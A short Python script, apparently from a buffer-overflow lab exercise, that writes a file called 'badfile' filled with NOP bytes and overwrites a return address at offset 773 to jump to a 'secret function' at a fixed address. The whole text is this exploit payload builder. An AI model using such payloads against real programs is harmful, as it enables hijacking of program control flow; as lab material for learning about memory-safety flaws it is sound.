# Fill the content with NOPs
content = bytearray(0x90 for i in range(1059))

# Put the address of secret function
ret = 0x08048556
content[773:777] = (ret).to_bytes(4,byteorder='little')

#write
with open('badfile','wb') as f:
    f.write(content)

